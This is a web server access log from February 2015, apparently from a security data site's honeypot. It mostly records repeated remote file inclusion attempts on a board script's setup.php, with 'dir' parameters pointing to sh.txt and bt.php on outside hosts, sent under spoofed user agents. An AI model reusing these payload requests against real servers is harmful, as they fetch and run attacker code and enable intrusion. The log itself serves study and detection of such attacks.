176.31.252.38 - - [19/Feb/2015:11:41:42 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:11:41:43 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:11:42:35 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:11:42:37 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:11:42:37 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:11:42:38 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:11:42:38 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:11:42:39 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:11:42:39 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:11:42:41 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
199.16.156.125 - - [19/Feb/2015:12:25:59 -0800] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.125 - - [19/Feb/2015:12:25:59 -0800] "GET / HTTP/1.1" 200 6732 "-" "Twitterbot/1.0" 
199.59.148.210 - - [19/Feb/2015:12:58:37 -0800] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.210 - - [19/Feb/2015:12:58:37 -0800] "GET / HTTP/1.1" 200 6732 "-" "Twitterbot/1.0" 
176.31.252.38 - - [19/Feb/2015:13:07:17 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [19/Feb/2015:13:07:18 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [19/Feb/2015:13:07:18 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [19/Feb/2015:13:07:20 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [19/Feb/2015:13:07:20 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [19/Feb/2015:13:07:21 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [19/Feb/2015:13:07:21 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [19/Feb/2015:13:07:22 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
70.114.252.5 - - [19/Feb/2015:13:13:06 -0800] "GET / HTTP/1.1" 304 189 "http://t.co/Qro1LCR4GM" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2305.3 Safari/537.36" 
70.114.252.5 - - [19/Feb/2015:13:13:06 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2305.3 Safari/537.36" 
187.65.50.8 - - [19/Feb/2015:13:46:33 -0800] "GET / HTTP/1.1" 301 483 "http://semalt.semalt.com/crawler.php?u=http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
187.65.50.8 - - [19/Feb/2015:13:46:34 -0800] "GET / HTTP/1.1" 200 6788 "http://semalt.semalt.com/crawler.php?u=http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
187.65.50.8 - - [19/Feb/2015:13:46:34 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
104.130.161.117 - - [19/Feb/2015:13:57:58 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.117 - - [19/Feb/2015:13:57:58 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [19/Feb/2015:13:57:59 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.115 - - [19/Feb/2015:13:57:59 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.113 - - [19/Feb/2015:13:58:03 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.113 - - [19/Feb/2015:13:58:03 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [19/Feb/2015:13:58:04 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.117 - - [19/Feb/2015:13:58:04 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
66.249.79.152 - - [19/Feb/2015:14:01:56 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
104.130.161.116 - - [19/Feb/2015:14:10:09 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.116 - - [19/Feb/2015:14:10:09 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.113 - - [19/Feb/2015:14:10:10 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.113 - - [19/Feb/2015:14:10:10 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.116 - - [19/Feb/2015:14:10:14 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.116 - - [19/Feb/2015:14:10:14 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.117 - - [19/Feb/2015:14:10:15 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.117 - - [19/Feb/2015:14:10:16 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [19/Feb/2015:14:18:25 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.115 - - [19/Feb/2015:14:18:25 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
176.31.252.38 - - [19/Feb/2015:14:59:10 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:14:59:11 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:14:59:12 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:14:59:13 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:14:59:13 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:14:59:14 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:14:59:14 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:14:59:15 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Avant Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [19/Feb/2015:15:33:55 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
176.31.252.38 - - [19/Feb/2015:15:33:56 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.geepower.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [19/Feb/2015:15:33:57 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.geepower.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
1.224.163.80 - - [19/Feb/2015:15:33:57 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:15:33:57 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:15:33:59 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:15:34:03 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:15:34:04 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
1.224.163.80 - - [19/Feb/2015:15:34:05 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
176.31.252.38 - - [19/Feb/2015:15:34:05 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
1.224.163.80 - - [19/Feb/2015:15:34:05 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [19/Feb/2015:15:34:07 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [19/Feb/2015:15:34:10 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:15:34:12 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:15:34:13 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:15:34:14 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:15:34:19 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [19/Feb/2015:15:34:20 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [19/Feb/2015:15:34:21 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
1.224.163.80 - - [19/Feb/2015:15:34:21 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
1.224.163.80 - - [19/Feb/2015:15:34:22 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
112.218.68.155 - - [19/Feb/2015:15:34:22 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:15:34:23 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:15:34:25 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
178.33.226.103 - - [19/Feb/2015:15:34:32 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:15:34:33 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:15:34:34 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:15:34:35 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
114.202.2.31 - - [19/Feb/2015:15:37:41 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [19/Feb/2015:15:37:42 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [19/Feb/2015:15:37:43 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
114.202.2.31 - - [19/Feb/2015:15:37:44 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
203.58.0.155 - - [19/Feb/2015:15:38:24 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
203.58.0.155 - - [19/Feb/2015:15:38:25 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
203.58.0.155 - - [19/Feb/2015:15:38:26 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
203.58.0.155 - - [19/Feb/2015:15:38:28 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
176.31.252.38 - - [19/Feb/2015:15:38:41 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [19/Feb/2015:15:38:43 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [19/Feb/2015:15:38:43 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [19/Feb/2015:15:38:44 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [19/Feb/2015:15:39:03 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:15:39:04 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:15:39:04 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:15:39:05 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
178.33.226.103 - - [19/Feb/2015:15:39:30 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:15:39:31 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:15:39:32 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:15:39:33 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
176.31.252.38 - - [19/Feb/2015:15:40:14 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:15:40:15 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:15:40:15 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:15:40:16 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:15:40:22 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:15:40:23 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:15:40:23 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:15:40:25 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
1.224.163.80 - - [19/Feb/2015:15:41:34 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [19/Feb/2015:15:41:36 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [19/Feb/2015:15:41:36 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [19/Feb/2015:15:41:37 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
46.119.124.167 - - [19/Feb/2015:15:42:17 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://na-verh.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4" 
46.119.124.167 - - [19/Feb/2015:15:42:17 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://na-verh.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4" 
46.119.124.167 - - [19/Feb/2015:15:42:18 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://na-verh.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4" 
118.129.167.21 - - [19/Feb/2015:15:42:35 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
118.129.167.21 - - [19/Feb/2015:15:42:37 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
118.129.167.21 - - [19/Feb/2015:15:42:37 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
118.129.167.21 - - [19/Feb/2015:15:42:38 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:15:43:41 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:15:43:43 -0800] "GET ////bbs/skin/ggambo5100_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:15:43:43 -0800] "POST ////bbs/skin/ggambo5100_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
